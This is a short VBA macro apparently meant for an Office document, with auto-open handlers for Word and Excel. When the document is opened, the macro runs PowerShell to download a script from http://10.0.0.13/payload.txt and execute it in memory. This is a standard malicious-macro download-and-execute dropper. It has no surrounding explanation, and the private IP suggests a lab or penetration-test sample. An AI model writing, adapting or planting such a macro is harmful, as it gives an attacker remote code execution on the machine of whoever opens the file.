Sub Auto_Open()
    Dim exec As String
    Dim testvar As String
    exec = "powershell.exe ""IEX ((new-object net.webclient).downloadstring('http://10.0.0.13/payload.txt'))"""
    Shell (exec)
End Sub
Sub AutoOpen()
    Auto_Open
End Sub
Sub Workbook_Open()
    Auto_Open
End Sub
